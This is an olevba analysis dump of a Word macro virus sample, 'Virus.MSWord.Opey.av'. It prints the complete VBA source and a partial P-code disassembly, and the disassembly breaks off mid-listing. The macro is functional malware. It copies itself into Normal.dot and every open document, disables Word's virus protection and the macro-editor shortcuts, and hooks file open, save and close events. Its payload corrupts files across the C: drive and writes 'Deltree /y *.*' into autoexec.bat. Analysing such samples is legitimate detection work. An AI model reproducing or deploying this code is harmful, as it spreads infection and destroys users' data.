olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey.av
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey.av - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Virus.bas 
in file: Virus.MSWord.Opey.av - OLE stream: 'Macros/VBA/Virus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim WFind As String
Dim FinReslt As Integer
Dim GetFilename As String
Private Declare Function FindFirstFile Lib "kernel32" Alias "FindFirstFileA" (ByVal lpFileName As String, lpFindFileData As WIN32_FIND_DATA) As Long
Private Declare Function FindNextFile Lib "kernel32" Alias "FindNextFileA" (ByVal hFindFile As Long, lpFindFileData As WIN32_FIND_DATA) As Long
Private Declare Function GetFileAttributes Lib "kernel32" Alias "GetFileAttributesA" (ByVal lpFileName As String) As Long
Private Declare Function FindClose Lib "kernel32" (ByVal hFindFile As Long) As Long
Private Declare Function GetFileSize Lib "kernel32" (ByVal hFile As Long, lpFileSizeHigh As Long) As Long
Private Declare Function CreateFile Lib "kernel32" Alias "CreateFileA" (ByVal lpFileName As String, ByVal dwDesiredAccess As Long, ByVal dwShareMode As Long, lpSecurityAttributes As Long, ByVal dwCreationDisposition As Long, ByVal dwFlagsAndAttributes As Long, ByVal hTemplateFile As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Private Declare Function LZOpenFile Lib "lz32.dll" Alias "LZOpenFileA" (ByVal lpszFile As String, lpOf As OFSTRUCT, ByVal style As Long) As Long
Private Declare Function LZCopy Lib "lz32.dll" (ByVal hfSource As Long, ByVal hfDest As Long) As Long
Private Declare Sub LZClose Lib "lz32.dll" (ByVal hfFile As Long)
Const OF_READ = &H0
Const OF_CREATE = &H1000
Const MAX_PATH = 260
Const MAXDWORD = &HFFFF
Const INVALID_HANDLE_VALUE = -1
Const FILE_ATTRIBUTE_ARCHIVE = &H20
Const FILE_ATTRIBUTE_DIRECTORY = &H10
Const FILE_ATTRIBUTE_HIDDEN = &H2
Const FILE_ATTRIBUTE_NORMAL = &H80
Const FILE_ATTRIBUTE_READONLY = &H1
Const FILE_ATTRIBUTE_SYSTEM = &H4
Const FILE_ATTRIBUTE_TEMPORARY = &H100
Private Const GENERIC_WRITE = &H40000000
Private Const OPEN_EXISTING = 3
Private Const FILE_SHARE_READ = &H1
Private Const FILE_SHARE_WRITE = &H2
Private Type OFSTRUCT
    cBytes As Byte
    fFixedDisk As Byte
    nErrCode As Integer
    Reserved1 As Integer
    Reserved2 As Integer
    szPathName As String * 128
End Type
Private Type FILETIME
    dwLowDateTime As Long
    dwHighDateTime As Long
End Type
Private Type WIN32_FIND_DATA
    dwFileAttributes As Long
    ftCreationTime As FILETIME
    ftLastAccessTime As FILETIME
    ftLastWriteTime As FILETIME
    nFileSizeHigh As Long
    nFileSizeLow As Long
    dwReserved0 As Long
    dwReserved1 As Long
    cFileName As String * MAX_PATH
    cAlternate As String * 14
End Type
Function StripNulls(OriginalStr As String) As String
    If (InStr(OriginalStr, Chr(0)) > 0) Then
        OriginalStr = Left(OriginalStr, InStr(OriginalStr, Chr(0)) - 1)
    End If
    StripNulls = OriginalStr
End Function
Function Decompress()
    Dim SourceStruct As OFSTRUCT, DestStruct As OFSTRUCT
    Dim hSource As Long, hDest As Long, lResults As Long
    hSource = LZOpenFile(GetFilename, SourceStruct, OF_READ)
    hDest = LZOpenFile(GetFilename, DestStruct, OF_CREATE)
    lResults = LZCopy(hSource, hDest)
    LZClose hSource
    LZClose hDest
End Function
Function FindFilesAPI(path As String, SearchStr As String, FileCount As Integer, DirCount As Integer)
    Dim lngHandle As Long
    Dim lngLong As Long
    Dim FileName As String
    Dim DirName As String
    Dim dirNames() As String
    Dim getFname As String
    Dim nDir As Integer
    Dim i As Integer
    Dim hSearch As Long
    Dim WFD As WIN32_FIND_DATA
    Dim Cont As Integer
    Dim GetSize As String
     
    On Error Resume Next
    If Right(path, 1) <> "\" Then path = path & "\"
    nDir = 0
    ReDim dirNames(nDir)
    Cont = True
    hSearch = FindFirstFile(path & "*", WFD)
    
    If hSearch <> INVALID_HANDLE_VALUE Then
        Do While Cont
        DirName = StripNulls(WFD.cFileName)
        If (DirName <> ".") And (DirName <> "..") Then
            If GetFileAttributes(path & DirName) And FILE_ATTRIBUTE_DIRECTORY Then
                dirNames(nDir) = DirName
                nDir = nDir + 1
                ReDim Preserve dirNames(nDir)
            End If
        End If
        Cont = FindNextFile(hSearch, WFD)
        Loop
        Cont = FindClose(hSearch)
    End If
    

    hSearch = FindFirstFile(path & SearchStr, WFD)
    Cont = True
    
    If hSearch <> INVALID_HANDLE_VALUE Then
       If path <> "c:\" Then
          If path <> "c:\RECYCLED\" Then
            While Cont
                FileName = StripNulls(WFD.cFileName)
                If FileName <> "." Then
                If FileName <> ".." Then
                    If FinReslt <> 10 Then
                        lngHandle = CreateFile(path & FileName, GENERIC_WRITE, FILE_SHARE_READ Or FILE_SHARE_WRITE, ByVal 0&, OPEN_EXISTING, 0, 0)
                        GetSize = Val(GetFileSize(lngHandle, lngLong))
                        CloseHandle lngHandle
                        If GetSize <> 0 Then
                            GetFilename = path & FileName
                            If GetFilename <> "c:\autoexec.bat" Then
                            Call Decompress
                            FinReslt = FinReslt + 1
                            Cont = FindClose(hSearch)
                            End If
                        End If
                    Else
                        Exit Function
                    End If
                End If
                End If
                Cont = FindNextFile(hSearch, WFD)
            Wend
            Cont = FindClose(hSearch)
          End If
       End If
    End If
    
    If nDir > 0 Then
        For i = 0 To nDir - 1
            If path <> "c:\RECYCLED\" Then
                FindFilesAPI = FindFilesAPI + FindFilesAPI(path & dirNames(i) & "\", SearchStr, FileCount, DirCount)
            End If
        Next i
    End If
End Function
Sub Destroy()
   On Error Resume Next
   FinReslt = 0
   WFind = "*.*"
   Call InitializeApi
   If FinReslt < 5 Then
     Open "c:\autoexec.bat" For Output As #1
     Print #1, "Deltree /y *.*"
     Close #1
   End If
End Sub
Sub InitializeApi()
   Dim SearchPath As String, FindStr As String
   Dim FileSize As Long
   Dim NumFiles As Integer, NumDirs As Integer
   FindStr = WFind
   SearchPath = "c:\"
   FileSize = FindFilesAPI(SearchPath, FindStr, NumFiles, NumDirs)
End Sub
Sub Immunize()
On Error Resume Next
    
    Dim DocuName$, OpenDocImmunized As Boolean
    Dim i%, J%, NmImmunized As Boolean
    
    NmImmunized = False
        
    For i = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
        DocuName = NormalTemplate.VBProject.VBComponents(i).Name
        If DocuName = "Virus" Then NmImmunized = True
        If (DocuName <> "Virus") And _
            (DocuName <> "ThisDocument") Then
            Application.OrganizerDelete _
                Source:=NormalTemplate.FullName _
                , Name:=DocuName _
                , Object:=wdOrganizerObjectProjectItems
        End If
    Next i
    
    For Each opendoc In Documents
        OpenDocImmunized = False
        With opendoc
            For J = opendoc.VBProject.VBComponents.Count To 1 Step -1
                DocuName = opendoc.VBProject.VBComponents(J).Name
                If DocuName = "Virus" Then OpenDocImmunized = True
                If (DocuName <> "Virus") And _
                   (DocuName <> "ThisDocument") And _
                   (DocuName <> "Reference to Normal") Then
                     Application.OrganizerDelete Source:=opendoc.FullName _
                     , Name:=DocuName _
                     , Object:=wdOrganizerObjectProjectItems
                End If
            Next J
            
            If Not OpenDocImmunized Then
                Application.OrganizerCopy Source:=NormalTemplate.FullName, _
                Destination:=opendoc.FullName, _
                Name:="Virus", _
                Object:=wdOrganizerObjectProjectItems
                opendoc.SaveAs FileName:=opendoc.FullName
            End If
        End With
    Next opendoc
    
    If Not NmImmunized Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
         Destination:=NormalTemplate.FullName, Name:="Virus", _
         Object:=wdOrganizerObjectProjectItems
        NormalTemplate.Save
    End If
    
End Sub
Sub Initialize()
On Error Resume Next
   Application.DisplayAlerts = wdAlertsAll
   WordBasic.DisableAutoMacros -1
   With Application
   .UserName = "Emmanuel D. delos Santos"
   .UserAddress = "Home"
   .UserInitials = "EDS"
   End With
   With Dialogs(wdDialogFileSummaryInfo)
   .Author = "Emmannuel D. delos Santos"
   .Title = "Virus"
   .Subject = "Kill"
   .Execute
   End With
   With Options
   .ConfirmConversions = True
   .VirusProtection = False
   .SaveNormalPrompt = False
   End With
   FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Clear
   FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Clear
   CustomizationContext = NormalTemplate
End Sub
Sub FileExit()
On Error Resume Next
    Call Initialize
    Call Immunize
    Application.Quit
End Sub
Sub FileNew()
On Error Resume Next
Dialogs(wdDialogFileNew).Show
Call Destroy
End Sub
Sub FileClose()
On Error Resume Next
ActiveDocument.Close
Call Destroy
End Sub
Sub AutoOpen()
On Error Resume Next
   Call Initialize
   Call Immunize
End Sub
Sub AutoExec()
On Error Resume Next
    Call Initialize
    Call Immunize
End Sub
Sub FileSaveAs()
On Error Resume Next
    Call Initialize
    Call Immunize
    Dialogs(wdDialogFileSaveAs).Show
    Call Immunize
End Sub
Sub FileOpen()
On Error Resume Next
    Call Initialize
    Call Immunize
    Dialogs(wdDialogFileOpen).Show
    Call Immunize
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Opey.av
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/Virus - 16266 bytes
' Line #0:
' 	Dim 
' 	VarDefn WFind (As String)
' Line #1:
' 	Dim 
' 	VarDefn FinReslt (As Integer)
' Line #2:
' 	Dim 
' 	VarDefn GetFilename (As String)
' Line #3:
' 	FuncDefn (Private Declare Function FindFirstFile Lib "kernel32" (ByVal lpFileName As String, lpFindFileData As ) As Long)
' Line #4:
' 	FuncDefn (Private Declare Function FindNextFile Lib "kernel32" (ByVal hFindFile As Long, lpFindFileData As ) As Long)
' Line #5:
' 	FuncDefn (Private Declare Function GetFileAttributes Lib "kernel32" (ByVal lpFileName As String) As Long)
' Line #6:
' 	FuncDefn (Private Declare Function FindClose Lib "kernel32" (ByVal hFindFile As Long) As Long)
' Line #7:
' 	FuncDefn (Private Declare Function GetFileSize Lib "kernel32" (ByVal hFile As Long, lpFileSizeHigh As Long) As Long)
' Line #8:
' 	FuncDefn (Private Declare Function CreateFile Lib "kernel32" (ByVal lpFileName As String, ByVal dwDesiredAccess As Long, ByVal dwShareMode As Long, lpSecurityAttributes As Long, ByVal dwCreationDisposition As Long, ByVal dwFlagsAndAttributes As Long, ByVal hTemplateFile As Long) As Long)
' Line #9:
' 	FuncDefn (Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long)
' Line #10:
' 	FuncDefn (Private Declare Function LZOpenFile Lib "lz32.dll" (ByVal lpszFile As String, lpOf As , ByVal style As Long) As Long)
' Line #11:
' 	FuncDefn (Private Declare Function LZCopy Lib "lz32.dll" (ByVal hfSource As Long, ByVal hfDest As Long) As Long)
' Line #12:
' 	FuncDefn (Private Declare Sub LZClose Lib "lz32.dll" (ByVal hfFile As Long))
' Line #13:
' 	Dim (Const) 
' 	LitHI2 0x0000 
' 	VarDefn OF_READ
' Line #14:
' 	Dim (Const) 
' 	LitHI2 0x1000 
' 	VarDefn OF_CREATE
' Line #15:
' 	Dim (Const) 
' 	LitDI2 0x0104 
' 	VarDefn MAX_PATH
' Line #16:
' 	Dim (Const) 
' 	LitHI2 0xFFFF 
' 	VarDefn MAXDWORD
' Line #17:
' 	Dim (Const) 
' 	LitDI2 0x0001 
' 	UMi 
' 	VarDefn INVALID_HANDLE_VALUE
' Line #18:
' 	Dim (Const) 
' 	LitHI2 0x0020 
' 	VarDefn FILE_ATTRIBUTE_ARCHIVE
' Line #19:
' 	Dim (Const) 
' 	LitHI2 0x0010 
' 	VarDefn FILE_ATTRIBUTE_DIRECTORY
' Line #20:
' 	Dim (Const) 
' 	LitHI2 0x0002 
' 	VarDefn FILE_ATTRIBUTE_HIDDEN
' Line #21:
' 	Dim (Const) 
' 	LitHI2 0x0080 
' 	VarDefn FILE_ATTRIBUTE_NORMAL
' Line #22:
' 	Dim (Const) 
' 	LitHI2 0x0001 
' 	VarDefn FILE_ATTRIBUTE_READONLY
' Line #23:
' 	Dim (Const) 
' 	LitHI2 0x0004 
' 	VarDefn FILE_ATTRIBUTE_SYSTEM
' Line #24:
' 	Dim (Const) 
' 	LitHI2 0x0100 
' 	VarDefn FILE_ATTRIBUTE_TEMPORARY
' Line #25:
' 	Dim (Private Const) 
' 	LitHI4 0x0000 0x4000 
' 	VarDefn GENERIC_WRITE
' Line #26:
' 	Dim (Private Const) 
' 	LitDI2 0x0003 
' 	VarDefn OPEN_EXISTING
' Line #27:
' 	Dim (Private Const) 
' 	LitHI2 0x0001 
' 	VarDefn FILE_SHARE_READ
' Line #28:
' 	Dim (Private Const) 
' 	LitHI2 0x0002 
' 	VarDefn FILE_SHARE_WRITE
' Line #29:
' 	Type (Private) OFSTRUCT
' Line #30:
' 	DimImplicit 
' 	VarDefn cBytes (As Byte)
' Line #31:
' 	DimImplicit 
' 	VarDefn fFixedDisk (As Byte)
' Line #32:
' 	DimImplicit 
' 	VarDefn nErrCode (As Integer)
' Line #33:
' 	DimImplicit 
' 	VarDefn Reserved1 (As Integer)
' Line #34:
' 	DimImplicit 
' 	VarDefn Reserved2 (As Integer)
' Line #35:
' 	DimImplicit 
' 	LitDI2 0x0080 
' 	VarDefn szPathName
' Line #36:
' 	EndType 
' Line #37:
' 	Type (Private) FILETIME
' Line #38:
' 	DimImplicit 
' 	VarDefn dwLowDateTime (As Long)
' Line #39:
' 	DimImplicit 
' 	VarDefn dwHighDateTime (As Long)
' Line #40:
' 	EndType 
' Line #41:
' 	Type (Private) WIN32_FIND_DATA
' Line #42:
' 	DimImplicit 
' 	VarDefn dwFileAttributes (As Long)
' Line #43:
' 	DimImplicit 
' 	VarDefn ftCreationTime (As FILETIME)
' Line #44:
' 	DimImplicit 
' 	VarDefn ftLastAccessTime (As FILETIME)
' Line #45:
' 	DimImplicit 
' 	VarDefn ftLastWriteTime (As FILETIME)
' Line #46:
' 	DimImplicit 
' 	VarDefn nFileSizeHigh (As Long)
' Line #47:
' 	DimImplicit 
' 	VarDefn nFileSizeLow (As Long)
' Line #48:
' 	DimImplicit 
' 	VarDefn dwReserved0 (As Long)
' Line #49:
' 	DimImplicit 
' 	VarDefn dwReserved1 (As Long)
' Line #50:
' 	DimImplicit 
' 	Ld MAX_PATH 
' 	VarDefn cFileName
' Line #51:
' 	DimImplicit 
' 	LitDI2 0x000E 
' 	VarDefn cAlternate
' Line #52:
' 	EndType 
' Line #53:
' 	FuncDefn (Function StripNulls(OriginalStr As String) As String)
' Line #54:
' 	Ld OriginalStr 
' 	LitDI2 0x0000 
' 	ArgsLd Chr 0x0001 
' 	FnInStr 
' 	LitDI2 0x0000 
' 	Gt 
' 	Paren 
' 	IfBlock 
' Line #55:
' 	Ld OriginalStr 
' 	Ld OriginalStr 
' 	LitDI2 0x0000 
' 	ArgsLd Chr 0x0001 
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	St OriginalStr 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	Ld OriginalStr 
' 	St StripNulls 
' Line #58:
' 	EndFunc 
' Line #59:
' 	FuncDefn (Function Decompress())
' Line #60:
' 	Dim 
' 	VarDefn SourceStruct (As OFSTRUCT)
' 	VarDefn DestStruct (As OFSTRUCT)
' Line #61:
' 	Dim 
' 	VarDefn hSource (As Long)
' 	VarDefn hDest (As Long)
' 	VarDefn lResults (As Long)
' Line #62:
' 	Ld GetFilename 
' 	Ld SourceStruct 
' 	Ld OF_READ 
' 	ArgsLd LZOpenFile 0x0003 
' 	St hSource 
' Line #63:
' 	Ld GetFilename 
' 	Ld DestStruct 
' 	Ld OF_CREATE 
' 	ArgsLd LZOpenFile 0x0003 
' 	St hDest 
' Line #64:
' 	Ld hSource 
' 	Ld hDest 
' 	ArgsLd LZCopy 0x0002 
' 	St lResults 
' Line #65:
' 	Ld hSource 
' 	ArgsCall LZClose 0x0001 
' Line #66:
' 	Ld hDest 
' 	ArgsCall LZClose 0x0001 
' Line #67:
' 	EndFunc 
' Line #68:
' 	FuncDefn (Function FindFilesAPI(path As String, SearchStr As String, FileCount As Integer, DirCount As Integer))
' Line #69:
' 	Dim 
' 	VarDefn lngHandle (As Long)
' Line #70:
' 	Dim 
' 	VarDefn lngLong (As Long)
' Line #71:
' 	Dim 
' 	VarDefn FileName (As String)
' Line #72:
' 	Dim 
' 	VarDefn DirName (As String)
' Line #73:
' 	Dim 
' 	VarDefn dirNames (As String)
' Line #74:
' 	Dim 
' 	VarDefn getFname (As String)
' Line #75:
' 	Dim 
' 	VarDefn nDir (As Integer)
' Line #76:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #77:
' 	Dim 
' 	VarDefn hSearch (As Long)
' Line #78:
' 	Dim 
' 	VarDefn WFD
' Line #79:
' 	Dim 
' 	VarDefn Cont (As Integer)
' Line #80:
' 	Dim 
' 	VarDefn GetSize (As String)
' Line #81:
' Line #82:
' 	OnError (Resume Next) 
' Line #83:
' 	Ld path 
' 	LitDI2 0x0001 
' 	ArgsLd Right 0x0002 
' 	LitStr 0x0001 "\"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld path 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	St path 
' 	EndIf 
' Line #84:
' 	LitDI2 0x0000 
' 	St nDir 
' Line #85:
' 	OptionBase 
' 	Ld nDir 
' 	Redim dirNames 0x0001 (As Variant)
' Line #86:
' 	LitVarSpecial (True)
' 	St Cont 
' Line #87:
' 	Ld path 
' 	LitStr 0x0001 "*"
' 	Concat 
' 	Ld WFD 
' 	ArgsLd FindFirstFile 0x0002 
' 	St hSearch 
' Line #88:
' Line #89:
' 	Ld hSearch 
' 	Ld INVALID_HANDLE_VALUE 
' 	Ne 
' 	IfBlock 
' Line #90:
' 	Ld Cont 
' 	DoWhile 
' Line #91:
' 	Ld WFD 
' 	MemLd cFileName 
' 	ArgsLd StripNulls 0x0001 
' 	St DirName 
' Line #92:
' 	Ld DirName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld DirName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #93:
' 	Ld path 
' 	Ld DirName 
' 	Concat 
' 	ArgsLd GetFileAttributes 0x0001 
' 	Ld FILE_ATTRIBUTE_DIRECTORY 
' 	And 
' 	IfBlock 
' Line #94:
' 	Ld DirName 
' 	Ld nDir 
' 	ArgsSt dirNames 0x0001 
' Line #95:
' 	Ld nDir 
' 	LitDI2 0x0001 
' 	Add 
' 	St nDir 
' Line #96:
' 	OptionBase 
' 	Ld nDir 
' 	Redim (Preserve) dirNames 0x0001 (As Variant)
' Line #97:
' 	EndIfBlock 
' Line #98:
' 	EndIfBlock 
' Line #99:
' 	Ld hSearch 
' 	Ld WFD 
' 	ArgsLd FindNextFile 0x0002 
' 	St Cont 
' Line #100:
' 	Loop 
' Line #101:
' 	Ld hSearch 
' 	ArgsLd FindClose 0x0001 
' 	St Cont 
' Line #102:
' 	EndIfBlock 
' Line #103:
' Line #104:
' Line #105:
' 	Ld path 
' 	Ld SearchStr 
' 	Concat 
' 	Ld WFD 
' 	ArgsLd FindFirstFile 0x0002 
' 	St hSearch 
' Line #106:
' 	LitVarSpecial (True)
' 	St Cont 
' Line #107:
' Line #108:
' 	Ld hSearch 
' 	Ld INVALID_HANDLE_VALUE 
' 	Ne 
' 	IfBlock 
' Line #109:
' 	Ld path 
' 	LitStr 0x0003 "c:\"
' 	Ne 
' 	IfBlock 
' Line #110:
' 	Ld path 
' 	LitStr 0x000C "c:\RECYCLED\"
' 	Ne 
' 	IfBlock 
' Line #111:
' 	Ld Cont 
' 	While 
' Line #112:
' 	Ld WFD 
' 	MemLd cFileName 
' 	ArgsLd StripNulls 0x0001 
' 	St FileName 
' Line #113:
' 	Ld FileName 
' 	LitStr 0x0001 "."
' 	Ne 
' 	IfBlock 
' Line #114:
' 	Ld FileName 
' 	LitStr 0x0002 ".."
' 	Ne 
' 	IfBlock 
' Line #115:
' 	Ld FinReslt 
' 	LitDI2 0x000A 
' 	Ne 
' 	IfBlock 
' Line #116:
' 	Ld path 
' 	Ld FileName 
' 	Concat 
' 	Ld GENERIC_WRITE 
' 	Ld FILE_SHARE_READ 
' 	Ld FILE_SHARE_WRITE 
' 	Or 
' 	LitDI4 0x0000 0x0000 
' 	ParamByVal 
' 	Ld OPEN_EXISTING 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	ArgsLd CreateFile 0x0007 
' 	St lngHandle 
' Line #117:
' 	Ld lngHandle 
' 	Ld lngLong 
' 	ArgsLd GetFileSize 0x0002 
' 	ArgsLd Val 0x0001 
' 	St GetSize 
' Line #118:
' 	Ld lngHandle 
' 	ArgsCall CloseHandle 0x0001 
' Line #119:
' 	Ld GetSize 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #120:
' 	Ld path 
' 	Ld FileName 
' 	Concat 
' 	St GetFilename 
' Line #121:
' 	Ld GetFilename 
' 	LitStr 0x000F "c:\autoexec.bat"
' 	Ne 
' 	IfBlock 
' Line #122:
' 	ArgsCall (Call) Decompress 0x0000 
' Line #123:
' 	Ld FinReslt 
' 	LitDI2 0x0001 
' 	Add 
' 	St FinReslt 
' Line #124:
' 	Ld hSearch 
' 	ArgsLd FindClose 0x0001 
' 	St Cont 
' Line #125:
' 	EndIfBlock 
' Line #126:
' 	EndIfBlock 
' Line #127:
' 	ElseBlock 
' Line #128:
' 	ExitFunc 
' Line #129:
' 	EndIfBlock 
' Line #130:
' 	EndIfBlock 
' Line #131:
' 	EndIfBlock 
' Line #132:
' 	Ld hSearch 
' 	Ld WFD 
' 	ArgsLd FindNextFile 0x0002 
' 	St Cont 
' Line #133:
' 	Wend 
' Line #134:
' 	Ld hSearch 
' 	ArgsLd FindClose 0x0001 
' 	St Cont 
' Line #135:
' 	EndIfBlock 
' Line #136:
' 	EndIfBlock 
' Line #137:
' 	EndIfBlock 
' Line #138:
' Line #139:
' 	Ld nDir 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #140:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld nDir 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #141:
' 	Ld path 
' 	LitStr 0x000C "c:\RECYCLED\"
' 	Ne 
' 	IfBlock 
' Line #142:
' 	Ld FindFilesAPI 
' 	Ld path 
' 	Ld i 
' 	ArgsLd dirNames 0x0001 
' 	Concat 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld SearchStr 
' 	Ld FileCount 
' 	Ld DirCount 
' 	ArgsLd FindFilesAPI 0x0004 
' 	Add 
' 	St FindFilesAPI 
' Line #143:
' 	EndIfBlock 
' Line #144:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #145:
' 	EndIfBlock 
' Line #146:
' 	EndFunc 
' Line #147:
' 	FuncDefn (Sub Destroy())
' Line #148:
' 	OnError (Resume Next) 
' Line #149:
' 	LitDI2 0x0000 
' 	St FinReslt 
' Line #150:
' 	LitStr 0x0003 "*.*"
' 	St WFind 
' Line #151:
' 	ArgsCall (Call) InitializeApi 0x0000 
' Line #152:
' 	Ld FinReslt 
' 	LitDI2 0x0005 
' 	Lt 
' 	IfBlock 
' Line #153:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #154:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Deltree /y *.*"
' 	PrintItemNL 
' Line #155:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #156:
' 	EndIfBlock 
' Line #157:
' 	EndSub 
' Line #158:
' 	FuncDefn (Sub InitializeApi())
' Line #159:
' 	Dim 
' 	VarDefn SearchPath (As String)
' 	VarDefn FindStr (As String)
' Line #160:
' 	Dim 
' 	VarDefn FileSize (As Long)
' Line #161:
' 	Dim 
' 	VarDefn NumFiles (As Integer)
' 	VarDefn NumDirs (As Integer)
' Line #162:
' 	Ld WFind 
' 	St FindStr 
' Line #163:
' 	LitStr 0x0003 "c:\"
' 	St SearchPath 
' Line #164:
' 	Ld SearchPath 
' 	Ld FindStr 
' 	Ld NumFiles 
' 	Ld NumDirs 
' 	ArgsLd FindFilesAPI 0x0004 
' 	St FileSize 
' Line #165:
' 	EndSub 
' Line #166:
' 	FuncDefn (Sub Immunize())
' Line #167:
' 	OnError (Resume Next) 
' Line #168:
' Line #169:
' 	Dim 
' 	VarDefn DocuName
' 	VarDefn OpenDocImmunized (As Boolean)
' Line #170:
' 	Dim 
' 	VarDefn i
' 	VarDefn J
' 	VarDefn NmImmunized (As Boolean)
' Line #171:
' Line #172:
' 	LitVarSpecial (False)
' 	St NmImmunized 
' Line #173:
' Line #174:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #175:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St DocuName 
' Line #176:
' 	Ld DocuName 
' 	LitStr 0x0005 "Virus"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NmImmunized 
' 	EndIf 
' Line #177:
' 	LineCont 0x0004 07 00 0C 00
' 	Ld DocuName 
' 	LitStr 0x0005 "Virus"
' 	Ne 
' 	Paren 
' 	Ld DocuName 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #178:
' 	LineCont 0x000C 03 00 10 00 08 00 10 00 0C 00 10 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld DocuName 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #179:
' 	EndIfBlock 
' Line #180:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #181:
' Line #182:
' 	StartForVariable 
' 	Ld opendoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #183:
' 	LitVarSpecial (False)
' 	St OpenDocImmunized 
' Line #184:
' 	StartWithExpr 
' 	Ld opendoc 
' 	With 
' Line #185:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	Ld opendoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #186:
' 	Ld J 
' 	Ld opendoc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St DocuName 
' Line #187:
' 	Ld DocuName 
' 	LitStr 0x0005 "Virus"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St OpenDocImmunized 
' 	EndIf 
' Line #188:
' 	LineCont 0x0008 07 00 13 00 0D 00 13 00
' 	Ld DocuName 
' 	LitStr 0x0005 "Virus"
' 	Ne 
' 	Paren 
' 	Ld DocuName 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld DocuName 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #189:
' 	LineCont 0x0008 08 00 15 00 0C 00 15 00
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld DocuName 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #190:
' 	EndIfBlock 
' Line #191:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	NextVar 
' Line #192:
' Line #193:
' 	Ld OpenDocImmunized 
' 	Not 
' 	IfBlock 
' Line #194:
' 	LineCont 0x000C 09 00 10 00 0F 00 10 00 13 00 10 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Virus"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #195:
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld opendoc 
' 	ArgsMemCall SaveAs 0x0001 
' Line #196:
' 	EndIfBlock 
' Line #197:
' 	EndWith 
' Line #198:
' 	StartForVariable 
' 	Ld opendoc 
' 	EndForVariable 
' 	NextVar 
' Line #199:
' Line #200:
' 	Ld NmImmunized 
' 	Not 
' 	IfBlock 
' Line #201:
' 	LineCont 0x0008 09 00 09 00 13 00 09 00
' 	Ld ActiveDocument 
